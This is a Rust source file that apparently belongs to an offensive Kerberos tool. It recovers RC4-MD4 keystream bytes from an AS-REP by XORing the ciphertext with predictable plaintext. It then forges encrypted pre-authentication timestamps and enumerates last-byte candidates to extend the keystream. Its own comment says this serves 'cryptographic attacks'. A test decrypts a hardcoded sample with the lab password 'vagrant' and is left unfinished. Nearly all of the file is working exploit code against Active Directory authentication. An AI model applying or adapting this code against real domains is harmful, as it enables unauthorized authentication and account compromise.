use core::fmt;
use std::io;

use bytes::Bytes;
use chrono::Utc;
use itertools::repeat_n;
use nthash::NtHash;
use rasn_kerberos::AsRep;
use rc4::{KeyInit, Rc4, StreamCipher};

use crate::structures::AsRepExt;

pub fn decrypt(ciphertext: &mut [u8], password: &str) -> Option<()> {
    let nt_hash = NtHash::from(password);
    let mut key = [0u8; 8];
    key.copy_from_slice(&nt_hash.as_slice()[..8]);
    let mut rc4 = Rc4::new(&key.into());
    rc4.apply_keystream(ciphertext);
    Some(())
}

pub struct Keystream(Vec<u8>);

impl Keystream {
    pub fn apply(&self, buf: &mut Vec<u8>) {
        assert!(buf.len() <= self.len());
        buf.iter_mut().zip(self.0.iter()).for_each(|(b, k)| *b ^= k);
    }

    pub fn len(&self) -> usize {
        self.0.len()
    }

    pub fn push(&mut self, byte: u8) {
        self.0.push(byte)
    }

    pub fn generate(nt_hash: &[u8; 16], length: usize) -> Self {
        let mut key = [0u8; 8];
        key.copy_from_slice(&nt_hash[..8]);
        let mut rc4 = Rc4::new(&key.into());
        let mut buf: Vec<u8> = repeat_n(0u8, length).collect();
        rc4.apply_keystream(&mut buf);
        Keystream(buf)
    }

    /// Get an RC4_MD4 keystream value from an AS_REP
    ///
    /// Since the first ~45 bytes of the EncAsRepPart is predictable, we can recover this portion
    /// of the RC4 keystream for use in cryptographic attacks
    pub fn from_as_rep(as_rep: &AsRep) -> io::Result<Self> {
        let ciphertext = as_rep.get_rc4_md4_enc_part().ok_or_else(|| {
            io::Error::new(
                io::ErrorKind::InvalidData,
                "Failed to extract keystream from AS_REP",
            )
        })?;
        let mut plaintext = [0u8; 24].to_vec();
        // plaintext.extend_from_slice(&[0x79, 0x82]);
        // plaintext.extend_from_slice(&(ciphertext.len() as u16 - 28).to_be_bytes());
        // plaintext.extend_from_slice(&[0x30, 0x82]);
        // plaintext.extend_from_slice(&(ciphertext.len() as u16 - 32).to_be_bytes());
        plaintext.push(0x79);
        let len_1 = ciphertext.len() - 28;
        match len_1 {
            0..=127 => plaintext.push(len_1 as u8),
            128..=255 => {
                plaintext.push(0x81);
                plaintext.push(len_1 as u8);
            }
            256..=65535 => {
                plaintext.push(0x82);
                plaintext.push((len_1 >> 8) as u8);
                plaintext.push(len_1 as u8);
            }
            _ => panic!("AS_REP shouldn't be this large!"),
        }
        plaintext.push(0x30);
        let len_2 = ciphertext.len() - 32;
        match len_2 {
            0..=127 => plaintext.push(len_2 as u8),
            128..=255 => {
                plaintext.push(0x81);
                plaintext.push(len_2 as u8);
            }
            256..=65535 => {
                plaintext.push(0x82);
                plaintext.push((len_2 >> 8) as u8);
                plaintext.push(len_2 as u8);
            }
            _ => panic!("AS_REP shouldn't be this large!"),
        }
        plaintext.extend_from_slice(&[
            0xa0, 0x1b, 0x30, 0x19, 0xa0, 0x03, 0x02, 0x01, 0x11, 0xa1, 0x12, 0x04, 0x10,
        ]);
        //dbg!(&plaintext.hex_dump());

        Ok(Self(xor(&plaintext, &ciphertext)))
    }
}

impl AsRef<[u8]> for Keystream {
    fn as_ref(&self) -> &[u8] {
        self.0.as_ref()
    }
}

impl fmt::Debug for Keystream {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "Keystream(0x")?;
        let _ = &self
            .0
            .iter()
            .take(8)
            .map(|b| write!(f, "{:02x?}", b))
            .collect::<fmt::Result>()?;
        write!(f, " Length={})", &self.0.len())
    }
}

impl From<Vec<u8>> for Keystream {
    fn from(inner: Vec<u8>) -> Self {
        Keystream(inner)
    }
}

pub struct EncryptedTimestamp(Bytes);

impl AsRef<[u8]> for EncryptedTimestamp {
    fn as_ref(&self) -> &[u8] {
        self.0.as_ref()
    }
}

impl From<EncryptedTimestamp> for Bytes {
    fn from(encrypted_timestamp: EncryptedTimestamp) -> Self {
        encrypted_timestamp.0
    }
}

impl EncryptedTimestamp {
    pub fn now(keystream: &Keystream) -> Self {
        assert!(keystream.len() >= 45);
        let ascii = format!("{}", Utc::now().format("%Y%m%d%H%M%SZ")).into_bytes();
        let mut buf = [0u8; 24].to_vec();
        buf.push(0x30);
        if keystream.len() > 45 {
            buf.push(0x80 ^ (keystream.len() - 45) as u8);
            buf.extend(repeat_n(0u8, keystream.len() - 46));
        }
        buf.extend_from_slice(&[0x13, 0xa0, 0x11, 0x18, 0x0f]);
        buf.extend(ascii);
        //dbg!(&buf.hex_dump());
        keystream.apply(&mut buf);
        EncryptedTimestamp(buf.into())
    }

    pub fn now_from_password(password: &str) -> Self {
        let nthash = NtHash::from(password);
        let keystream = Keystream::generate(nthash.as_ref(), 45);
        // let ascii = format!("{}", Utc::now().format("%Y%m%d%H%M%SZ")).into_bytes();
        // let mut buf = [0u8; 24].to_vec();
        // buf.extend_from_slice(&[0x30, 0x1a, 0xa0, 0x11, 0x18, 0x0f]);
        // buf.extend(ascii);
        // // Millis
        // buf.extend_from_slice(&[0xa1, 0x05, 0x02, 0x03, 0x0d, 0xe3, 0x75]);
        // //dbg!(&buf.hex_dump());
        // keystream.apply(&mut buf);
        // EncryptedTimestamp(buf.into())
        Self::now(&keystream)
    }

    // pub fn stretch(nthash: &[u8; 16]) -> Self {
    //     let mut key = [0u8; 8];
    //     key.copy_from_slice(&nthash[..8]);
    //     let mut rc4 = Rc4::new(&key.into());
    //     let mut buf = [0u8; 24].to_vec();
    //     buf.extend_from_slice(
    //         hex!(
    //             "30 84 00 00  00 20 a0 84  00 00 00 15  18 84 00 00"
    //             "00 0f"
    //         )
    //         .as_slice(),
    //     );
    //     let ascii = format!("{}", Utc::now().format("%Y%m%d%H%M%SZ")).into_bytes();
    //     buf.extend_from_slice(&ascii);
    //     //buf.push(0x00);
    //     buf.extend_from_slice(hex!("a1 03 02 01 00").as_slice());
    //     rc4.apply_keystream(&mut buf);
    //     EncryptedTimestamp(buf.into())
    // }

    pub fn iter_last_byte(keystream: &Keystream) -> impl Iterator<Item = (Self, u8)> {
        assert!(keystream.len() >= 45);
        let ascii = format!("{}", Utc::now().format("%Y%m%d%H%M%SZ")).into_bytes();
        let mut buf = [0u8; 24].to_vec();
        buf.push(0x30);
        match keystream.len() {
            45 => {
                buf.extend_from_slice(&[0x14, 0xa0, 0x12, 0x18, 0x10]);
            }
            46..=49 => {
                buf.push(0x80 ^ (keystream.len() - 45) as u8);
                buf.extend(repeat_n(0u8, keystream.len() - 46));
                buf.extend_from_slice(&[0x14, 0xa0, 0x12, 0x18, 0x10]);
            }
            50..=53 => {
                buf.extend_from_slice(&[0x84, 0x00, 0x00, 0x00]);
                buf.push(keystream.len() as u8 - 29);
                buf.push(0xa0);
                buf.push(0x80 ^ (keystream.len() - 49) as u8);
                buf.extend(repeat_n(0u8, keystream.len() - 50));
                buf.extend_from_slice(&[0x12, 0x18, 0x10]);
            }
            54..=57 => {
                buf.extend_from_slice(&[0x84, 0x00, 0x00, 0x00]);
                buf.push(keystream.len() as u8 - 29);
                buf.extend_from_slice(&[0xa0, 0x84, 0x00, 0x00, 0x00]);
                buf.push(keystream.len() as u8 - 35);
                buf.push(0x18);
                buf.push(0x80 ^ (keystream.len() - 53) as u8);
                buf.extend(repeat_n(0u8, keystream.len() - 54));
                buf.push(0x10);
            }
            58..=60 => {
                buf.push(0x80 ^ (keystream.len() - 56) as u8);
                buf.extend(repeat_n(0u8, keystream.len() - 57));
                buf.push(0x20);
                //buf.extend_from_slice(&[0x81, 0x20]);
                buf.extend_from_slice(&[0xa0, 0x84, 0x00, 0x00, 0x00, 0x15]);
                buf.extend_from_slice(&[0x18, 0x84, 0x00, 0x00, 0x00, 0x0f]);
            }
            _ => unreachable!(),
        }
        buf.extend(ascii);
        let millis = keystream.len() >= 58;
        if millis {
            buf.extend_from_slice(&[0xa1, 0x03, 0x02]);
        }
        //dbg!(&buf.hex_dump());
        keystream.apply(&mut buf);
        (0u8..=255).map(move |last| {
            let mut inner = Vec::new();
            inner.extend_from_slice(&buf);
            inner.push(last);
            let key_byte_candidate = if millis {
                inner.push(0x00); // plaintext milliseconds value shouldn't matter
                last ^ 0x01
            } else {
                last
            };
            (EncryptedTimestamp(inner.into()), key_byte_candidate)
        })
    }
}

fn xor(a: &[u8], b: &[u8]) -> Vec<u8> {
    a.iter().zip(b).map(|(i, j)| i ^ j).collect()
}

#[cfg(test)]
mod tests {
    use hex_literal::hex;
    use pretty_hex::PrettyHex;

    use super::*;

    #[test]
    fn decrypt_works() {
        let mut ciphertext = hex!(
            "25 68 26 7b 35 10 56 55 92 ba 69 c3 44 6a 9d ac"
            "99 fa 97 fc bc c0 40 d8 6c 81 a5 63 e7 2f bd 40"
            "17 73 20 2d f5 2c d2 c8 aa 35 69 77 b9 7c 25 16"
            "53 37 c5 b7 d0 e3 02 f1 80 fa 81 6d 4e 65 ed 94"
            "9b 9f 5f f1 0b cc 70 27 7e 7e c0 7d ec df ce 16"
            "5a 45 d9 15 cd 79 a5 00 56 dd 42 0e 09 fc 95 f7"
            "7d 24 56 3e ff 84 ce 99 85 51 74 10 51 64 5f 2f"
            "6d e8 bc f5 53 75 ab 1c 1b 9d 0c 3e 29 13 92 54"
            "62 d5 4b 24 2c e7 78 b6 7d 34 8e 89 c1 46 2b 87"
            "15 17 8a d5 92 ba f9 14 ad f1 8c b7 03 9d 93 d6"
            "94 91 1e a0 93 c7 2a bf 4d a5 e2 71 83 20 d5 72"
            "5b 8b 56 4b 81 bd 5b 09 e8 b4 ce de 94 1c 87 26"
            "8f e1 3e f3 3d 94 26 2d 08 66 63 d3 6e 6c 33 ac"
            "a6 ec e8 a7 53 77 ed 8a 81 61 3e e4 17 79 51 a0"
            "a1 e5 0a 7f 48 e1 ac 91 fb 24 8d 2f a8 89 3f e9"
            "ef 8d 25 7e b8 97 d6 57 61 6b b3 b0 a2 3e 60 7f"
            "58 ce 1a c2 80 07 39 bd 13 15 33 38 69 9d 0b 12"
            "17 55 8e 63 fd 74 56 4d c5 e7 08 26 91 e2 c3 8a"
            "b3 fa b2 a7 73 00 c7 2f 70 76 5f c2 3f 54 5c 36"
            "9d de a5 46 7f 91 f7 8e cf d2 43 af 5e c9 4a f1"
            "08 be"
        );
        let password = "vagrant";
        decrypt(&mut ciphertext, password).unwrap();
        println!("{:?}", &ciphertext.hex_dump());
        todo!()
    }
}
